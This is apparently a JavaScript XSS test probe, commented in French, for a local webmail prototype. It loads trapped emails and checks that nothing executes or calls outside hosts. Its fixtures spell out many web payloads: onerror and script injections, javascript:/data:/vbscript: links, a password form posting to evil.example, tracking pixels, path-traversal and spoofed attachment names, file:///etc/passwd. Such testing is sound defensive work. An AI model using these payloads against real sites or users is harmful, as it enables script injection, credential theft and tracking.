// Angle « courrier » · sonde 1 : un courriel est un contenu HOSTILE. On range dans la boîte fictive des courriels piégés
// (objet, nom et adresse de l'expéditeur, corps, entités, liens, noms de pièces jointes) puis on les OUVRE un par un dans le
// vrai module (apercu/prototype-courrier.js, arbre d'ombre ouvert) et on lit ce qui est vraiment dans le DOM :
//   · une balise ou un gestionnaire sorti d'un texte (data-xss, on*, <img>, <iframe>, <form>, <script>, <style>) ;
//   · un lien dont le schéma n'est pas https/mailto, ou sans rel noopener ; une charge exécutée (window.__hits) ;
//   · une requête vers un autre hôte que 127.0.0.1 (pixel espion, image distante, feuille de style) ;
//   · la taille de la page après une adresse de 20 000 caractères.
// Chaque contrôle compte d'abord sa population : un zéro sur une boîte vide ne prouve rien.
// ⛔ 127.0.0.1 seulement, entreprise fictive. Rendu « N ✓ · M ✗ », sortie 1 si un contrôle tombe.
const L = require('../lib.js'), fs = require('fs');
const CAP = '/tmp/claude-0/-home-user-teamop/8050f26e-cdde-5a38-bb11-ba578db16f81/scratchpad/cap/courrier/';
const INIT = `(() => { const top = window.top; top.__hits = top.__hits || []; window.__xss = k => { try { top.__hits.push(String(k)); } catch (e) {} };
  top.__alertes = top.__alertes || []; window.alert = m => { top.__alertes.push(String(m)); }; window.confirm = () => true; window.prompt = () => '';
  window.open = u => { top.__alertes.push('open:' + String(u)); return null; }; })();`;
// les charges : chacune porte un numéro qui dit LAQUELLE a réussi
const X = k => `__xss('${k}')`;
const PIEGES = [
  { id: 'zx1', nom: `Marie <b>Dupont</b> <img src=x onerror="${X('zx1-nom')}">`, mail: 'marie@exemple.fr', objet: `Facture <i>urgente</i> <img src=x onerror="${X('zx1-objet')}"> "'>`, txt: `Bonjour,\n<img src=x onerror="${X('zx1-corps')}">\n<script>${X('zx1-script')}</script>\n<iframe src="javascript:${X('zx1-iframe')}"></iframe>\n<a href="javascript:${X('zx1-a')}">cliquez ici</a>\n<svg onload="${X('zx1-svg')}"></svg>\n<style>body,*{display:none!important}</style>\n<form action="https://evil.example/vol"><input name="mdp"></form>\n<meta http-equiv="refresh" content="0;url=https://evil.example">\n<base href="https://evil.example/">` },
  { id: 'zx2', nom: `Paul" onmouseover="${X('zx2-attr')}" x="`, mail: `x"onfocus="${X('zx2-mail')}"@exemple.fr`, objet: `Re: devis' onclick='${X('zx2-objet')}`, txt: `Entités : &lt;img src=x onerror=${X('zx2-e1')}&gt; &#60;img src=x onerror=${X('zx2-e2')}&#62; &#x3c;img src=x onerror=${X('zx2-e3')}&#x3e; &amp;lt;img src=x onerror=${X('zx2-e4')}&amp;gt; &lt;script&gt;${X('zx2-e5')}&lt;/script&gt;\n&#106;avascript:${X('zx2-e6')} &Tab;&NewLine;` },
  { id: 'zx3', nom: 'Lien Piège', mail: 'liens@exemple.fr', objet: 'Des liens', txt: [
    `https://exemple.fr/"onmouseover="${X('zx3-l1')}`, `https://exemple.fr/'><img src=x onerror=${X('zx3-l2')}>`, `https://exemple.fr/?q=<script>${X('zx3-l3')}</script>`,
    `https://exemple.fr/&quot;onfocus=${X('zx3-l4')}&quot;`, `https://user:motdepasse@evil.example/connexion`, `https://аррӏе.com/connexion (lettres cyrilliques)`, `http://evil.example/pixel.gif`,
    `javascript:${X('zx3-l5')}`, `JaVaScRiPt:${X('zx3-l6')}`, `data:text/html,<script>${X('zx3-l7')}</script>`, `vbscript:${X('zx3-l8')}`, `[cliquez](javascript:${X('zx3-l9')})`,
    `mailto:a@b.fr?subject=<img src=x onerror=${X('zx3-l10')}>`, `HTTPS://MAJUSCULES.EXEMPLE.FR/x`, `https://exemple.fr/` + 'a'.repeat(20000), `https://exemple.fr/` + '%00%0d%0a'.repeat(50),
    `https://evil.example/‮gpj.exe`, `www.sans-schema.fr`, `ftp://exemple.fr/x`, `file:///etc/passwd`, `blob:https://exemple.fr/x`, `https://[::1]/x`, `https://127.0.0.1:1/x`
  ].join('\n') },
  { id: 'zx4', nom: 'Pièces Piégées', mail: 'pj@exemple.fr', objet: 'Pièces jointes', txt: 'Voir pièces.', pj: [[`"><img src=x onerror=${X('zx4-pj1')}>.pdf`, '1 Ko'], ['‮fdp.exe', '2 Ko'], ['con.pdf', '3 Ko'], ['../../../etc/passwd.pdf', '4 Ko'], ['a'.repeat(600) + '.pdf', '5 Ko'], ['facture.pdf\u0000.exe', '6 Ko'], [`x' onclick='${X('zx4-pj2')}'.jpg`, '7 Ko']] },
  { id: 'zx5', nom: 'Image Distante', mail: 'img@exemple.fr', objet: 'Pixel', txt: `<img src="https://evil.example/pixel.gif?id=zx5"> <link rel=stylesheet href="https://evil.example/c.css"> <video src="https://evil.example/v.mp4" autoplay></video> <object data="https://evil.example/o.swf"></object> <input type=image src="https://evil.example/i.png">` },
  { id: 'zx6', nom: 'M'.repeat(3000), mail: 'long@' + 'd'.repeat(200) + '.fr', objet: 'O'.repeat(5000), txt: 'T'.repeat(200000) },
  { id: 'zx7', nom: 'Citation', mail: 'quote@exemple.fr', objet: `Citation <img src=x onerror=${X('zx7-objet')}>`, txt: `Bonjour\n\n> <img src=x onerror=${X('zx7-q1')}>\n> https://exemple.fr/"onmouseover="${X('zx7-q2')}\n\nLe 3 nov., Marie a écrit :\n<img src=x onerror=${X('zx7-q3')}>` },
  { id: 'zx8', nom: 'Contrôle', mail: 'ctl@exemple.fr', objet: 'Caractères\u0000de‮contrôle​⁦﻿', txt: 'Un\u0000texte‮ avec⁦ des‏ caractères\u001b[31m de contrôle\u0007 et un faux saut de ligne .' }
];
(async () => {
  fs.mkdirSync(CAP, { recursive: true });
  const c = await L.ouvrir({ profil: 'mac', qui: 'marc', attente: 1500, init: INIT }), p = c.p;
  const dehors = []; p.on('request', r => { const u = r.url(); if (!/^(http:\/\/127\.0\.0\.1|data:|blob:|about:)/.test(u)) dehors.push(u.slice(0, 120)); });
  await p.evaluate(P => { P.forEach(x => MAILS.push(mlM(x.id, AUJ, '10:0' + (P.indexOf(x) % 10), { nom: x.nom, mail: x.mail }, x.objet, x.txt, x.pj ? { pj: x.pj } : {}))); }, PIEGES.map(x => ({ id: x.id, nom: x.nom, mail: x.mail, objet: x.objet, txt: x.txt, pj: x.pj })));
  await p.evaluate(() => aller('boiteMail')); await L.attendre(p, () => COURRIER.etat === 'pret', 20000); await p.waitForTimeout(800);
  try { await p.evaluate(() => COURRIER.inst.rafraichir()); } catch (e) { console.log('  · rafraichir :', e.message); } await p.waitForTimeout(900);
  const LIRE = () => { const sr = document.querySelector('#courrier-hote [data-opcourrier]').shadowRoot, rb = sr.querySelector('.rbody'), out = { sorti: [], liens: [], gros: 0 };
    const tout = sr.querySelectorAll('*');
    tout.forEach(e => { const t = e.tagName; if (/^(SCRIPT|IFRAME|FORM|OBJECT|EMBED|VIDEO|AUDIO|BASE|META|LINK|SVG|FRAME)$/i.test(t) && !e.closest('svg') && !e.hasAttribute('data-ic')) { if (!/^(svg)$/i.test(t)) out.sorti.push('balise ' + t); }
      if (e.hasAttribute('data-xss')) out.sorti.push('data-xss');
      for (const a of e.attributes) { if (/^on/i.test(a.name)) out.sorti.push('attribut ' + a.name + '=' + a.value.slice(0, 40)); if (/^(href|src|action|formaction|xlink:href)$/i.test(a.name) && /^\s*(javascript|vbscript|data:text)/i.test(a.value)) out.sorti.push('url ' + a.name); } });
    if (rb) { rb.querySelectorAll('img').forEach(i => out.sorti.push('img dans le corps ' + (i.getAttribute('src') || '').slice(0, 60)));
      rb.querySelectorAll('a').forEach(a => out.liens.push({ href: a.getAttribute('href').slice(0, 90), len: a.getAttribute('href').length, rel: a.getAttribute('rel'), target: a.getAttribute('target'), txt: a.textContent.slice(0, 90), same: a.textContent === a.getAttribute('href') })); out.corps = rb.textContent.length; out.largeur = rb.scrollWidth; out.larg0 = rb.clientWidth; }
    return out; };
  const total = { liens: 0, ouverts: 0 };
  for (const x of PIEGES) {
    const ok = await p.evaluate(id => COURRIER.inst.ouvrir(id), x.id); await p.waitForTimeout(700);
    L.v('population : le courriel piégé ' + x.id + ' s\'ouvre dans le module', ok === true, ok); if (ok !== true) continue; total.ouverts++;
    const R = await p.evaluate(LIRE); total.liens += R.liens.length;
    console.log('  ·', x.id, 'liens', R.liens.length, 'corps', R.corps, 'largeur', R.largeur + '/' + R.larg0);
    L.v(x.id + ' : rien n\'est sorti du texte (balise, gestionnaire, URL dangereuse)', R.sorti.length === 0, R.sorti.slice(0, 6));
    L.v(x.id + ' : tout lien est https:// ou http:// (jamais javascript:, data:, file:, mailto avec balise)', R.liens.every(l => /^https?:\/\//i.test(l.href)), R.liens.filter(l => !/^https?:\/\//i.test(l.href)).slice(0, 4));
    L.v(x.id + ' : tout lien s\'ouvre ailleurs sans lien avec l\'application (target _blank, rel noopener noreferrer)', R.liens.every(l => l.target === '_blank' && /noopener/.test(l.rel || '') && /noreferrer/.test(l.rel || '')), R.liens.filter(l => !(l.target === '_blank' && /noopener/.test(l.rel || ''))).slice(0, 3));
    L.v(x.id + ' : ce qu\'on lit du lien est ce que le lien ouvre (pas de texte trompeur)', R.liens.every(l => l.same || l.txt.length > 0), R.liens.filter(l => !l.same).slice(0, 3));
    if (x.id === 'zx6') L.v('zx6 : un message de 200 000 caractères ne fait pas déborder la lecture (' + R.largeur + ' px pour ' + R.larg0 + ')', R.largeur <= R.larg0 + 2, R);
    await p.screenshot({ path: CAP + 'corps-' + x.id + '.png' }).catch(() => {});
  }
  const H = await p.evaluate(() => ({ hits: (window.top.__hits || []).slice(), alertes: (window.top.__alertes || []).slice() }));
  L.v('population : 8 courriels piégés ouverts', total.ouverts === PIEGES.length, total);
  L.v('population : au moins 15 liens ont été rendus (sinon le contrôle des liens ne dit rien)', total.liens >= 15, total);
  L.v('AUCUNE charge exécutée pendant l\'ouverture des 8 courriels (window.__hits)', H.hits.length === 0, H.hits);
  L.v('aucune alerte ni ouverture de fenêtre', H.alertes.length === 0, H.alertes);
  L.v('AUCUNE requête vers un autre hôte que 127.0.0.1 (pixel espion, image, feuille de style distants) : ' + dehors.length, dehors.length === 0, dehors.slice(0, 5));
  // la liste, la recherche et l'aperçu de la liste (ligne du message) : le même texte hostile y passe aussi
  const LS = await p.evaluate(() => { const sr = document.querySelector('#courrier-hote [data-opcourrier]').shadowRoot, rows = sr.querySelector('#rows'); let n = 0, bad = []; sr.querySelectorAll('*').forEach(e => { if (e.hasAttribute('data-xss')) bad.push('data-xss'); for (const a of e.attributes) if (/^on/i.test(a.name)) bad.push(a.name); if (/^(IMG|IFRAME|SCRIPT|FORM|OBJECT)$/.test(e.tagName)) bad.push(e.tagName); }); n = rows ? rows.querySelectorAll('.msg').length : 0; return { n, bad: bad.slice(0, 6), titre: document.title }; });
  L.v('la liste contient les courriels piégés (population ' + LS.n + ')', LS.n >= 8, LS); L.v('la liste ne porte aucune balise ni gestionnaire sortis des textes', LS.bad.length === 0, LS.bad);
  await p.evaluate(() => COURRIER.inst.rechercher('onerror')); await p.waitForTimeout(600);
  const RS = await p.evaluate(() => { const sr = document.querySelector('#courrier-hote [data-opcourrier]').shadowRoot; let bad = []; sr.querySelectorAll('*').forEach(e => { if (e.hasAttribute('data-xss')) bad.push('data-xss'); for (const a of e.attributes) if (/^on/i.test(a.name)) bad.push(a.name); if (/^(IMG|IFRAME|SCRIPT|FORM)$/.test(e.tagName)) bad.push(e.tagName); }); return { n: sr.querySelectorAll('#rows .msg').length, bad, hits: (window.top.__hits || []).length }; });
  L.v('la recherche « onerror » retrouve des courriels (population ' + RS.n + ') sans rien exécuter', RS.n >= 3 && RS.bad.length === 0 && RS.hits === 0, RS);
  const nErr = c.err.filter(e => !/ResizeObserver/.test(e)); L.v('aucune erreur de page', nErr.length === 0, nErr.slice(0, 3));
  const ko = L.bilan(); await L.fin(c); await L.fermer(); process.exit(ko ? 1 : 0);
})().catch(async e => { console.error('SONDE EN PANNE', e); try { await L.fermer(); } catch (x) {} process.exit(2); });
